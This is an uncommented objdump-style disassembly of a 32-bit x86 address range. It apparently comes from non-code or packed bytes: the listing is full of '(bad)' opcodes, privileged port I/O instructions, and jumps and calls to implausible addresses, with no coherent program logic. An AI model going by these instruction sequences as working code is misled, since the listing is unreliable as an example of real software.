  40e0cd:	mov    ch,0xb8
  40e0cf:	enter  0x6f1d,0xcc
  40e0d3:	retf   
  40e0d4:	mov    ebp,0x1f4cd54f
  40e0d9:	daa    
  40e0da:	hlt    
  40e0db:	inc    esp
  40e0dc:	mov    ebx,0x342f4367
  40e0e1:	test   eax,0x4da36951
  40e0e6:	add    dl,cl
  40e0e8:	push   0xffffffef
  40e0ea:	out    0x19,al
  40e0ec:	or     BYTE PTR [di],ch
  40e0ef:	mov    al,ds:0x96691773
  40e0f4:	daa    
  40e0f5:	loope  0x40e105
  40e0f7:	(bad)  
  40e0f8:	daa    
  40e0f9:	jno    0x40e123
  40e0fb:	ret    0x6751
  40e0fe:	(bad)  
  40e0ff:	adc    ebx,DWORD PTR [ecx-0x4fa2924f]
  40e105:	out    0xd0,eax
  40e107:	pop    ecx
  40e108:	sbb    BYTE PTR [ebp+0x3a884e92],0xe4
  40e10f:	js     0x40e18b
  40e111:	repnz mov ds:0xc8cedb20,eax
  40e117:	and    esi,DWORD PTR [edi-0x70]
  40e11a:	sub    eax,0x91205e73
  40e11f:	adc    BYTE PTR [edx],bh
  40e121:	xor    DWORD PTR [ecx+ecx*8],esi
  40e124:	mov    eax,0x9bffad05
  40e129:	dec    edx
  40e12a:	push   eax
  40e12b:	jns    0x40e100
  40e12d:	fsubr  QWORD PTR [edx+0x5c]
  40e130:	add    esi,0x22
  40e133:	xor    cl,BYTE PTR [ebp+0x9bf2b0b]
  40e139:	nop
  40e13a:	ret    0x40d1
  40e13d:	into   
  40e13e:	cld    
  40e13f:	push   ebx
  40e140:	cld    
  40e141:	(bad)  
  40e142:	jle    0x40e174
  40e144:	lods   eax,DWORD PTR ds:[esi]
  40e145:	lods   al,BYTE PTR ds:[esi]
  40e146:	pop    edi
  40e147:	mov    bh,0xa
  40e149:	pop    eax
  40e14a:	dec    esp
  40e14b:	and    BYTE PTR [edi+0x6b2ff732],dh
  40e151:	fnstcw WORD PTR [esi]
  40e153:	pop    es
  40e154:	mov    ebx,0xbef0ef41
  40e159:	stc    
  40e15a:	push   ebp
  40e15b:	cmp    DWORD PTR [edi],0x1abdbbab
  40e161:	hlt    
  40e162:	push   ebx
  40e163:	mov    ds:0xfac6ae79,eax
  40e168:	test   al,0x63
  40e16a:	out    0xb4,al
  40e16c:	out    0x3c,al
  40e16e:	xchg   edi,eax
  40e16f:	adc    al,0x94
  40e171:	pop    ebx
  40e172:	loope  0x40e122
  40e174:	jno    0x40e16c
  40e176:	lods   eax,DWORD PTR ds:[esi]
  40e177:	sub    ecx,DWORD PTR [ecx+0x59]
  40e17a:	data16 test al,0x2
  40e17d:	inc    ebx
  40e17e:	or     eax,0xae046927
  40e183:	cdq    
  40e184:	xor    al,0xdb
  40e186:	push   es
  40e187:	add    BYTE PTR [ebx-0xa059ef6],0xdc
  40e18e:	xor    al,0x5d
  40e190:	fst    st(7)
  40e192:	bound  ecx,QWORD PTR [ecx+edi*8-0x3fb3185]
  40e199:	add    ah,ah
  40e19b:	leave  
  40e19c:	mov    ds:0x4275473a,al
  40e1a1:	sub    al,0xbb
  40e1a3:	and    BYTE PTR [edx-0xf],bl
  40e1a6:	test   BYTE PTR [esi-0x71fc87d4],0xb0
  40e1ad:	retf   0x7198
  40e1b0:	popf   
  40e1b1:	sbb    DWORD PTR [edi-0x72],esi
  40e1b4:	(bad)  [ecx+0x1e]
  40e1b7:	xchg   ebp,ebp
  40e1b9:	mov    BYTE PTR [edx],al
  40e1bb:	cmp    BYTE PTR [esi],al
  40e1bd:	mul    DWORD PTR [eax-0x67]
  40e1c0:	pop    ds
  40e1c1:	push   0x15
  40e1c3:	mov    bh,0xea
  40e1c5:	push   eax
  40e1c6:	sahf   
  40e1c7:	mov    eax,ds:0x846857d3
  40e1cc:	ss out 0xc3,eax
  40e1cf:	xor    eax,0x38b54007
  40e1d4:	mov    edx,0xdd8798c6
  40e1d9:	jno    0x40e161
  40e1db:	js     0x40e1f9
  40e1dd:	sub    bl,BYTE PTR [edi-0x6d]
  40e1e0:	jp     0x40e247
  40e1e2:	mov    cl,0xfa
  40e1e4:	mov    eax,ds:0x8f96c3e8
  40e1e9:	pop    ss
  40e1ea:	test   DWORD PTR [ecx+0x5c7e8706],0xda8374b3
  40e1f4:	rol    BYTE PTR [esi],0x44
  40e1f7:	sbb    edx,ebx
  40e1f9:	mov    ds:0x13a96584,al
  40e1fe:	push   ebp
  40e1ff:	das    
  40e200:	les    esp,FWORD PTR [edx-0x4aae0b8]
  40e206:	sbb    BYTE PTR [eax-0x60],ch
  40e209:	call   0x2e7448a9
  40e20e:	call   FWORD PTR [ebx+edi*1-0x3cc7163d]
  40e215:	hlt    
  40e216:	push   0x8e838cc0
  40e21b:	sub    DWORD PTR [eax-0x38],eax
  40e21e:	cmp    DWORD PTR [esi+0x36a4c118],ebp
  40e224:	pop    esp
  40e225:	int    0x98
  40e227:	ins    DWORD PTR es:[edi],dx
  40e228:	dec    ecx
  40e229:	jecxz  0x40e28a
  40e22b:	sbb    BYTE PTR [eax+0x7df87a0a],ch
  40e231:	mov    ebx,0x5bca5206
  40e236:	loope  0x40e29f
  40e238:	js     0x40e293
  40e23a:	sbb    BYTE PTR [eax+ebp*4+0x40],al
  40e23e:	cs repz jne 0x40e1d7
  40e242:	dec    ebp
  40e243:	mov    BYTE PTR [ecx-0x48f86d07],al
  40e249:	rcl    DWORD PTR [ebx+ebp*4+0x27755225],cl
  40e250:	out    0xe4,eax
  40e252:	jmp    0x6dd85bb4
  40e257:	mov    dh,0x43
  40e259:	jp     0x40e22a
  40e25b:	retf   
  40e25c:	outs   dx,DWORD PTR ds:[esi]
  40e25d:	or     al,0x42
  40e25f:	mov    eax,0x2e85fcb7
  40e264:	cmc    
  40e265:	ret    0xf803
  40e268:	xchg   esi,eax
  40e269:	dec    esp
  40e26a:	adc    ch,al
  40e26c:	aam    0x2e
  40e26e:	cld    
  40e26f:	cmp    cl,0x48
  40e272:	xchg   esp,eax
  40e273:	dec    esi
  40e274:	(bad)  
  40e275:	jbe    0x40e2d2
  40e277:	inc    edi
  40e278:	stc    
  40e279:	push   ebx
  40e27a:	xchg   esp,eax
  40e27b:	out    dx,al
  40e27c:	sub    bl,BYTE PTR [ecx-0x5fe0b053]
  40e282:	hlt    
  40e283:	jecxz  0x40e258
  40e285:	call   0x3a83:0xe5a2ed7f
  40e28c:	dec    edi
  40e28d:	push   0xffffffe7
  40e28f:	mov    ds:0xbbaab5c1,al
  40e294:	push   esp
  40e295:	mov    al,ds:0x8b45defa
  40e29a:	adc    DWORD PTR [ebp+edx*2+0x6d],eax
  40e29e:	fst    st(4)
  40e2a0:	sbb    al,0x99
  40e2a2:	mov    edx,0x832ea17
  40e2a7:	push   0x5
  40e2a9:	fcmovbe st,st(7)
  40e2ab:	fsubr  DWORD PTR [ecx+eax*8-0x67b2ff4]
  40e2b2:	(bad)  
  40e2b3:	sub    ebx,DWORD PTR [ecx]
  40e2b5:	adc    eax,0x99be3ec8
  40e2ba:	cmc    
  40e2bb:	mov    ah,0x32
  40e2bd:	mov    esi,0xb2832f80
  40e2c2:	jle    0x40e290
  40e2c4:	push   ss
  40e2c5:	out    0x70,eax
  40e2c7:	sub    DWORD PTR [edx],edi
  40e2c9:	outs   dx,DWORD PTR ds:[esi]
  40e2ca:	outs   dx,DWORD PTR ds:[esi]
  40e2cb:	and    ah,dl
  40e2cd:	inc    edx
  40e2ce:	mov    ch,0x20
  40e2d0:	xchg   esi,eax
  40e2d1:	popa   
  40e2d2:	push   cs
  40e2d3:	enter  0x1fbd,0xe7
  40e2d7:	dec    edi
  40e2d8:	push   ebp
  40e2d9:	xchg   esi,eax
  40e2da:	and    bl,BYTE PTR [ebp-0x5f59528c]
  40e2e0:	cdq    
  40e2e1:	adc    eax,0xb244bad4
  40e2e6:	test   al,0x84
  40e2e8:	jp     0x40e30c
  40e2ea:	xchg   esi,eax
  40e2eb:	fdivr  DWORD PTR [edi+0x32]
  40e2ee:	aas    
  40e2ef:	mul    BYTE PTR [ecx]
  40e2f1:	xor    eax,0xaae7a582
  40e2f6:	push   esp
  40e2f7:	cmp    ebx,esp
  40e2f9:	pop    es
  40e2fa:	and    al,0xec
  40e2fc:	ja     0x40e29d
  40e2fe:	ret    0xf930
  40e301:	loopne 0x40e293
  40e303:	or     bl,dl
  40e305:	xchg   ebp,ebx
  40e307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e308:	fisub  WORD PTR [edx+0x4db3294b]
  40e30e:	loop   0x40e35f
  40e310:	inc    edi
  40e311:	lods   al,BYTE PTR ds:[esi]
  40e312:	xchg   ebp,eax
  40e313:	ret    0x7473
  40e316:	sbb    al,0xc5
  40e318:	sub    ah,dh
  40e31a:	lods   eax,DWORD PTR ds:[esi]
  40e31b:	stos   BYTE PTR es:[edi],al
  40e31c:	xchg   edi,eax
  40e31d:	dec    ebx
  40e31e:	add    edi,ebp
  40e320:	dec    ebx
  40e321:	pop    edx
  40e322:	sub    dh,BYTE PTR [eax+0x34]
  40e325:	lahf   
  40e326:	sbb    dl,BYTE PTR [esi+0x6b393f2f]
  40e32c:	jge    0x40e2be
  40e32e:	fwait
  40e32f:	daa    
  40e330:	mov    al,ds:0xd30be309
  40e335:	or     al,0xe2
  40e337:	icebp  
  40e338:	sbb    dl,BYTE PTR [eax+0x11]
  40e33b:	push   edx
  40e33c:	xor    ecx,DWORD PTR [edi]
  40e33e:	stc    
  40e33f:	xor    al,0x68
  40e341:	push   edi
  40e342:	lods   eax,DWORD PTR ds:[esi]
  40e343:	xor    BYTE PTR [edx],dh
  40e345:	adc    DWORD PTR [ebp-0x2d652414],ebp
  40e34b:	addr16 out 0xce,al
  40e34e:	jmp    0x40e311
  40e350:	xor    al,0x3b
  40e352:	add    al,0xe
  40e354:	mov    bl,0xb2
  40e356:	iret   
  40e357:	jmp    0x40e3c1
  40e359:	arpl   WORD PTR [ebp-0x1cf51eb7],di
  40e35f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e360:	rcr    BYTE PTR [esi],0x65
  40e363:	adc    al,0x89
  40e365:	jnp    0x40e3b8
  40e367:	mov    edi,0xbd5c960c
  40e36c:	aad    0xdd
  40e36e:	sub    dl,BYTE PTR [edx-0x6d7b82ba]
  40e374:	out    dx,al
  40e375:	data16 xor BYTE PTR [ebx+edx*2],0x27
  40e37a:	scas   eax,DWORD PTR es:[edi]
  40e37b:	pop    eax
  40e37c:	lods   eax,DWORD PTR ds:[esi]
  40e37d:	dec    ebx
  40e37e:	or     eax,0x87de1218
  40e383:	inc    ebx
  40e384:	jo     0x40e3c1
  40e386:	cdq    
  40e387:	xor    BYTE PTR [esi+0x4a],0xe2
  40e38b:	and    ch,cl
  40e38d:	push   edx
  40e38e:	popa   
  40e38f:	sbb    esi,DWORD PTR [ebp-0x3c]
  40e392:	cmp    BYTE PTR [esi-0x54f8c49c],dh
  40e398:	sub    ah,BYTE PTR [ebx]
  40e39a:	inc    esp
  40e39b:	ror    DWORD PTR [ebx+0x57],cl
  40e39e:	xchg   edi,eax
  40e39f:	and    al,0x1e
  40e3a1:	cdq    
  40e3a2:	inc    ebx
  40e3a3:	fwait
  40e3a4:	pop    ss
  40e3a5:	repz sti 
  40e3a7:	jb     0x40e36b
  40e3a9:	mov    dl,0x45
  40e3ab:	add    DWORD PTR [esi],ebx
  40e3ad:	ja     0x40e35c
  40e3af:	sbb    esi,DWORD PTR [ecx]
  40e3b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b2:	mov    BYTE PTR [ebx+ebx*4],al
  40e3b5:	daa    
  40e3b6:	mul    BYTE PTR [ecx-0x5100c5ab]
  40e3bc:	pop    esi
  40e3bd:	fidiv  WORD PTR [edi]
  40e3bf:	jae    0x40e37e
  40e3c1:	push   edx
  40e3c2:	xor    ch,BYTE PTR ds:0xe40a2c7a
  40e3c8:	xchg   esi,eax
  40e3c9:	lock mov bl,0xc1
  40e3cc:	xor    ebp,edx
  40e3ce:	push   ebx
  40e3cf:	ror    DWORD PTR [ecx],cl
  40e3d1:	mov    eax,ds:0xe38b30c6
  40e3d6:	cld    
  40e3d7:	xor    al,ah
  40e3d9:	cwde   
  40e3da:	mov    al,ds:0x242f3f41
  40e3df:	add    DWORD PTR [edi+0x2b86cf3a],ebp
  40e3e5:	or     ah,BYTE PTR [esi-0x1f]
  40e3e8:	iretw  
  40e3ea:	or     al,bl
  40e3ec:	out    0x90,eax
  40e3ee:	cmp    DWORD PTR [edx],ebp
  40e3f0:	dec    edi
  40e3f1:	inc    ebx
  40e3f2:	fisttp WORD PTR [edx-0x6dfa2e04]
  40e3f8:	mov    eax,ds:0x13139151
  40e3fd:	pop    eax
  40e3fe:	loopne 0x40e3fd
  40e400:	xchg   DWORD PTR [ebp-0x3f],edx
  40e403:	pop    ds
  40e404:	adc    BYTE PTR [esi+0x28],cl
  40e407:	pop    ecx
  40e408:	jmp    0x40e457
  40e40a:	adc    eax,0xcaee0e72
  40e40f:	jle    0x40e39d
  40e411:	aas    
  40e412:	xor    eax,ebx
  40e414:	cmc    
  40e415:	stc    
  40e416:	jmp    FWORD PTR [eax-0x57]
  40e419:	mov    esi,esi
  40e41b:	icebp  
  40e41c:	pop    esp
  40e41d:	(bad)  
  40e41f:	pop    edx
  40e420:	and    al,0x14
  40e422:	aas    
  40e423:	leave  
  40e424:	mov    bl,0xca
  40e426:	mov    bl,BYTE PTR [ebx]
  40e428:	mov    cl,0x8d
  40e42a:	cmp    ah,BYTE PTR [ebx]
  40e42c:	int3   
  40e42d:	xor    dh,BYTE PTR ds:0xcaa9ea65
  40e433:	pushf  
  40e434:	sub    DWORD PTR [eax-0x4e],ebx
  40e437:	dec    edi
  40e438:	retf   
  40e439:	(bad)
  40e43c:	jnp    0x40e4ba
  40e43e:	add    eax,DWORD PTR [eax+edx*1]
  40e441:	and    ah,BYTE PTR [edi]
  40e443:	adc    ch,BYTE PTR [ebx-0x5c3e22db]
  40e449:	or     dl,BYTE PTR [eax]
  40e44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e44c:	mov    DWORD PTR [esp+eax*2],eax
  40e44f:	cmp    eax,0x217ef963
  40e454:	repnz ins BYTE PTR es:[edi],dx
  40e456:	inc    esi
  40e457:	ret    0xc4e6
  40e45a:	jl     0x40e4bb
  40e45c:	bound  esp,QWORD PTR [esi+0x687d3b8]
  40e462:	sub    dl,BYTE PTR [edi]
  40e464:	xor    eax,0x703d8ce8
  40e469:	in     eax,dx
  40e46a:	ds stos BYTE PTR es:[edi],al
  40e46c:	loope  0x40e410
  40e46e:	xchg   esi,eax
  40e46f:	mov    ds:0x42f31dd2,eax
  40e474:	stos   DWORD PTR es:[edi],eax
  40e475:	outs   dx,BYTE PTR ds:[esi]
  40e476:	cmc    
  40e477:	xor    eax,0xde041df0
  40e47c:	jno    0x40e4f7
  40e47e:	jno    0x40e439
  40e480:	in     al,0xc3
  40e482:	sbb    DWORD PTR [eax-0x29],edi
  40e485:	dec    ecx
  40e486:	jg     0x40e465
  40e488:	fdiv   DWORD PTR [ebp-0x61]
  40e48b:	mov    ecx,0x26cb12be
  40e490:	jg     0x40e4c9
  40e492:	loop   0x40e48c
  40e494:	ds xchg ebp,eax
  40e496:	aaa    
  40e497:	icebp  
  40e498:	cmp    DWORD PTR [ebp-0x4b],eax
  40e49b:	mov    dh,0x99
  40e49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e49e:	xchg   esp,eax
  40e49f:	pop    ss
  40e4a0:	sbb    DWORD PTR [edx+ecx*8+0x3230443e],ebp
  40e4a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4a8:	ja     0x40e4c9
  40e4aa:	iret   
  40e4ab:	shl    BYTE PTR [ebx],1
  40e4ad:	mov    BYTE PTR [ebx],dh
  40e4af:	cwde   
  40e4b0:	xchg   BYTE PTR [edi-0x73],cl
  40e4b3:	add    BYTE PTR [ecx+0x47],0x39
  40e4b7:	les    esi,FWORD PTR [ecx]
  40e4b9:	mov    esi,0x35fde58e
  40e4be:	pop    edx
  40e4bf:	and    DWORD PTR [edi+edi*2],0xffffffec
  40e4c3:	sub    esi,esp
  40e4c5:	inc    ecx
  40e4c6:	cmp    al,0x19
  40e4c8:	push   cs
  40e4c9:	scas   al,BYTE PTR es:[edi]
  40e4ca:	test   al,0x4
  40e4cc:	ins    DWORD PTR es:[edi],dx
  40e4cd:	or     edi,edx
  40e4cf:	push   es
  40e4d0:	mov    al,0x1e
  40e4d2:	jmp    0x90eb6027
  40e4d7:	xchg   BYTE PTR [ebp+0x1d],dl
  40e4da:	stos   DWORD PTR es:[edi],eax
  40e4db:	mov    eax,ds:0x109ac3fe
  40e4e0:	dec    eax
  40e4e1:	cmp    BYTE PTR [ebx],ch
  40e4e3:	mov    edx,0x26fa1022
  40e4e8:	dec    edi
  40e4e9:	(bad)  
  40e4ea:	scas   al,BYTE PTR es:[edi]
  40e4eb:	out    0xe8,eax
  40e4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4ee:	ret    
  40e4ef:	sub    cl,BYTE PTR [esi+0xb]
  40e4f2:	fdivr  QWORD PTR [ebx+0x42]
  40e4f5:	imul   eax,esi,0xeaa9016f
  40e4fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4fc:	fcmovnb st,st(6)
  40e4fe:	shl    ebp,0xc5
  40e501:	fiadd  WORD PTR [ebx+0x6e29b5cc]
  40e507:	fucomip st,st(3)
  40e509:	outs   dx,DWORD PTR ds:[esi]
  40e50a:	or     ch,BYTE PTR [ebx+0x78]
  40e50d:	dec    edi
  40e50e:	jno    0x40e565
  40e510:	sub    edi,DWORD PTR [esi+ebp*1-0x4cf3ecec]
  40e517:	mov    ds:0x21686718,eax
  40e51c:	scas   eax,DWORD PTR es:[edi]
  40e51d:	je     0x40e582
  40e51f:	pop    ecx
  40e520:	mul    DWORD PTR [ecx-0x34995346]
  40e526:	mov    WORD PTR [eax+0x64],gs
  40e529:	xor    DWORD PTR [edi+0x28adf49],edi
  40e52f:	das    
  40e530:	mov    edi,0x9df4dc0c
  40e535:	inc    ecx
  40e536:	lock cdq 
  40e538:	fiadd  DWORD PTR [eax-0x7eada028]
  40e53e:	jae    0x40e4c9
  40e540:	aas    
  40e541:	lahf   
  40e542:	addps  xmm3,XMMWORD PTR [esi-0x40]
  40e546:	sar    BYTE PTR [ebp+0x5b4b3ef0],0x30
  40e54d:	dec    esp
  40e54e:	scas   al,BYTE PTR es:[edi]
  40e54f:	sbb    edx,edx
  40e551:	inc    esi
  40e552:	(bad)  
  40e553:	rcr    DWORD PTR [eax],1
  40e555:	inc    esi
  40e556:	(bad)  
  40e558:	outs   dx,BYTE PTR ds:[esi]
  40e559:	add    cl,al
  40e55b:	fld    QWORD PTR [edx+eiz*4-0x2929622d]
  40e562:	xchg   esi,eax
  40e563:	ficom  DWORD PTR [ebp+0x13b7c1fe]
  40e569:	or     bl,bl
  40e56b:	inc    esi
  40e56c:	mov    edx,0x73812c8b
  40e571:	rcl    BYTE PTR [edx+0x3d],1
  40e574:	out    0x7d,al
  40e576:	lock pmaxsw mm0,QWORD PTR [ebx]
  40e57a:	mov    al,0x48
  40e57c:	stos   BYTE PTR es:[edi],al
  40e57d:	popf   
  40e57e:	jmp    0xb108:0x309964e4
  40e585:	pop    ds
  40e586:	sub    ebx,DWORD PTR [ebp+0x47]
  40e589:	add    DWORD PTR [eax+edi*4-0x20beb02e],ecx
  40e590:	dec    edx
  40e591:	ja     0x40e552
  40e593:	sub    ah,bh
  40e595:	loopne 0x40e59c
  40e597:	sbb    ah,BYTE PTR [ecx]
  40e599:	push   cs
  40e59a:	pop    es
  40e59b:	adc    dl,BYTE PTR [ebp-0x28a33322]
  40e5a1:	pop    es
  40e5a2:	cmp    dh,ah
  40e5a4:	pop    es
  40e5a5:	push   ds
  40e5a6:	sub    eax,0x8edf3301
  40e5ab:	xchg   edx,eax
  40e5ac:	(bad)  
  40e5ad:	pop    esp
  40e5ae:	pop    esi
  40e5af:	call   0x9eae:0x8dfc7939
  40e5b6:	fcom   DWORD PTR [eax+0x39]
  40e5b9:	dec    esi
  40e5ba:	outs   dx,BYTE PTR ds:[esi]
  40e5bb:	jle    0x40e566
  40e5bd:	sub    ch,bh
  40e5bf:	int3   
  40e5c0:	arpl   WORD PTR [ebx+0x4c],bx
  40e5c3:	pop    edx
  40e5c4:	mov    edx,0x1ecb6a2
  40e5c9:	gs ja  0x40e641
  40e5cc:	sahf   
  40e5cd:	push   ds
  40e5ce:	(bad)  
  40e5cf:	sti    
  40e5d0:	je     0x40e553
  40e5d2:	sbb    esp,DWORD PTR [esi-0xa]
  40e5d5:	sbb    al,0x27
  40e5d7:	jno    0x40e5d9
  40e5d9:	mov    eax,0x1bb192c7
  40e5de:	mov    eax,ds:0x8ee0790e
  40e5e3:	add    eax,0x6092093d
  40e5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e9:	inc    eax
  40e5ea:	shl    BYTE PTR [edi+0x3b3f4d33],0x81
  40e5f1:	(bad)  
  40e5f2:	fwait
  40e5f3:	push   esp
  40e5f4:	sbb    edx,esi
  40e5f6:	sub    eax,0x49baa08b
  40e5fb:	push   esp
  40e5fc:	mov    DWORD PTR ds:0xe1dcb8fa,edi
  40e602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e603:	mov    dl,BYTE PTR [ebp+0x1a790981]
  40e609:	add    BYTE PTR [edi],dh
  40e60b:	in     al,dx
  40e60c:	mov    bl,0xcc
  40e60e:	mov    ds:0x42b563e9,eax
  40e613:	pop    ds
  40e614:	adc    edx,edx
  40e616:	test   BYTE PTR [ebp+0xf9b7bd7],ah
  40e61c:	enter  0xd80a,0x12
  40e620:	cmp    al,0x58
  40e622:	xchg   BYTE PTR [edi],bh
  40e624:	rcl    BYTE PTR [ecx-0x2a5e0525],0x4a
  40e62b:	ins    BYTE PTR es:[edi],dx
  40e62c:	lods   al,BYTE PTR ds:[esi]
  40e62d:	sar    edi,cl
  40e62f:	xchg   edi,eax
  40e630:	dec    edi
  40e631:	fwait
  40e632:	mov    eax,0x48039a7b
  40e637:	test   BYTE PTR [bp+di-0xa33],bl
  40e63c:	mov    edx,0x8ecae874
  40e641:	les    esp,FWORD PTR [edx+0x4]
  40e644:	je     0x40e632
  40e646:	or     esp,DWORD PTR [esp+esi*4]
  40e649:	and    bh,ah
  40e64b:	das    
  40e64c:	add    DWORD PTR ds:[ebx],ebx
  40e64f:	aam    0x66
  40e651:	pop    ebx
  40e652:	xor    bl,al
  40e654:	ror    BYTE PTR [ebp+0x8],cl
  40e657:	adc    eax,0x797e10c0
  40e65c:	mov    ebx,0xc7a93817
  40e661:	inc    esi
  40e662:	retf   
  40e663:	push   ds
  40e664:	(bad)  
  40e666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e668:	add    al,0x10
  40e66a:	jo     0x40e6bb
  40e66c:	mov    eax,0x5782bfc9
  40e671:	sub    esp,DWORD PTR [ebp+edx*4-0x5beac03c]
  40e678:	lock or eax,DWORD PTR [edi-0x30d705cb]
  40e67f:	mov    BYTE PTR [ebp+0x250c0c11],dl
  40e685:	ror    DWORD PTR [ecx-0x1d77a3ae],1
  40e68b:	popf   
  40e68c:	add    al,0xb
  40e68e:	jp     0x40e6f6
  40e690:	popf   
  40e691:	icebp  
  40e692:	cmp    ah,BYTE PTR [ebx+ebx*2+0x24]
  40e696:	cli    
  40e697:	sub    DWORD PTR [eax+ecx*8-0x5b7d3600],edx
  40e69e:	pop    eax
  40e69f:	mov    esi,0x2a5f86ad
  40e6a4:	test   eax,0xbd535ed
  40e6a9:	sbb    eax,0x44963552
  40e6ae:	push   ebx
  40e6af:	mov    eax,ds:0x36c83df4
  40e6b4:	jle    0x40e707
  40e6b6:	xchg   ebp,eax
  40e6b7:	push   esi
  40e6b8:	neg    BYTE PTR [ecx]
  40e6ba:	mov    edi,eax
  40e6bc:	mov    bh,bh
  40e6be:	jl     0x40e655
  40e6c0:	fwait
  40e6c1:	mov    ecx,0x1b611586
  40e6c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6c7:	sbb    BYTE PTR ds:0x61fb1b6c,dh
  40e6cd:	sub    ah,BYTE PTR [ebx]
  40e6cf:	sub    BYTE PTR [ebx+0x629da8ed],cl
  40e6d5:	pop    ebx
  40e6d6:	push   cs
  40e6d7:	push   edx
  40e6d8:	in     eax,dx
  40e6d9:	popf   
  40e6da:	in     eax,0x70
  40e6dc:	sbb    BYTE PTR [edx-0x470f7fd2],bl
  40e6e2:	sub    esi,DWORD PTR [eax]
  40e6e4:	mov    ah,0x15
  40e6e6:	je     0x40e756
  40e6e8:	xchg   esi,ebx
  40e6ea:	stos   DWORD PTR es:[edi],eax
  40e6eb:	stc    
  40e6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ed:	js     0x40e6f9
  40e6ef:	dec    edx
  40e6f0:	retf   
  40e6f1:	xchg   edi,eax
  40e6f2:	and    bh,BYTE PTR ds:0xc439f18e
  40e6f8:	not    bh
  40e6fa:	xor    eax,0x9a9e1701
  40e6ff:	mov    ds:0xd0f89a8a,eax
  40e704:	add    al,0x1d
  40e706:	loop   0x40e751
  40e708:	inc    ecx
  40e709:	push   esp
  40e70a:	mov    edi,ebp
  40e70c:	out    0x59,al
  40e70e:	push   eax
  40e70f:	shr    bh,0x27
  40e712:	and    esi,DWORD PTR [esi+0x35]
  40e715:	cmp    dl,dh
  40e717:	sbb    al,0x4a
  40e719:	jnp    0x40e75c
  40e71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e71c:	inc    ebp
  40e71d:	ret    
  40e71e:	push   ds
  40e71f:	imul   DWORD PTR [esi-0x1a42a49a]
  40e725:	and    DWORD PTR [ebx+0x13e345fc],edx
  40e72b:	mov    ds:0xe10488ca,eax
  40e730:	pop    edi
  40e731:	jmp    FWORD PTR [edx-0x70]
  40e734:	addr16 mov bl,0xd8
  40e737:	mov    al,0x90
  40e739:	cmp    esi,esi
  40e73b:	cmp    BYTE PTR [ecx+esi*8-0x30],dh
  40e73f:	sahf   
  40e740:	shl    DWORD PTR [ebx-0x3c],0x3c
  40e744:	rol    BYTE PTR [eax+0x6e3ea90a],1
  40e74a:	int    0xd9
  40e74c:	jb     0x40e6f1
  40e74e:	test   eax,0x40982cbe
  40e753:	inc    ebp
  40e754:	and    al,0x98
  40e757:	or     edx,DWORD PTR [ecx+0xf]
  40e75a:	sbb    eax,0xe592295a
  40e75f:	fidiv  WORD PTR [esi]
  40e761:	scas   eax,DWORD PTR es:[edi]
  40e762:	addr16 cs mov bh,dl
  40e766:	jns    0x40e6fd
  40e768:	and    BYTE PTR [edx-0x51],ah
  40e76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e76c:	sub    eax,0xfea6dac4
  40e771:	jl     0x40e76e
  40e773:	hlt    
  40e774:	clc    
  40e775:	adc    BYTE PTR [eax+0x7d23dcc9],dl
  40e77b:	shl    BYTE PTR [edi-0x44],cl
  40e77e:	fldcw  WORD PTR [ecx+eiz*2+0x1741b17e]
  40e785:	and    al,0x3a
  40e787:	(bad)  
  40e789:	cmp    esp,DWORD PTR [ebx+0x4eaad7a8]
  40e78f:	ins    BYTE PTR es:[edi],dx
  40e790:	stos   BYTE PTR es:[edi],al
  40e791:	stos   BYTE PTR es:[edi],al
  40e792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e793:	mov    cl,0xaa
  40e795:	ret    
  40e796:	test   al,0xf9
  40e798:	ret    0x40be
  40e79b:	fstp   TBYTE PTR [eax+0x56cca24b]
  40e7a1:	mov    edi,0xbf34a6ab
  40e7a6:	pushf  
  40e7a7:	lods   eax,DWORD PTR ds:[esi]
  40e7a8:	or     bl,ah
  40e7aa:	push   esp
  40e7ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ac:	fcmovnu st,st(7)
  40e7ae:	out    dx,al
  40e7af:	adc    BYTE PTR [ecx],bl
  40e7b1:	sub    eax,0xd548571c
  40e7b6:	mov    ds:0x9d83b9fe,eax
  40e7bb:	in     eax,dx
  40e7bc:	outs   dx,DWORD PTR ds:[esi]
  40e7bd:	sbb    al,0x8d
  40e7bf:	sahf   
  40e7c0:	shl    DWORD PTR [ecx-0x1e],0xa6
  40e7c4:	out    dx,eax
  40e7c5:	inc    eax
  40e7c6:	mov    ecx,0x9a7f7ec2
  40e7cb:	leave  
  40e7cc:	inc    DWORD PTR [esi-0x5c]
  40e7cf:	out    dx,eax
  40e7d0:	sub    DWORD PTR [ebx-0x346cb8d9],esi
  40e7d6:	inc    esp
  40e7d7:	stos   DWORD PTR es:[edi],eax
  40e7d8:	repz xor BYTE PTR [ecx+eax*1],dh
  40e7dc:	les    eax,FWORD PTR [ebx+esi*1]
  40e7df:	leave  
  40e7e0:	inc    eax
  40e7e1:	pop    esi
  40e7e2:	inc    esi
  40e7e3:	mov    ecx,0x76742f6c
  40e7e8:	outs   dx,BYTE PTR ds:[si]
  40e7ea:	lock ins BYTE PTR es:[edi],dx
  40e7ec:	fild   WORD PTR [ebx]
  40e7ee:	sub    DWORD PTR [ecx+0x4834fcd2],eax
  40e7f4:	ins    DWORD PTR es:[edi],dx
  40e7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7f6:	xchg   edx,eax
  40e7f7:	test   DWORD PTR [edi],0x5fb71d00
  40e7fd:	aaa    
  40e7fe:	jns    0x40e7ff
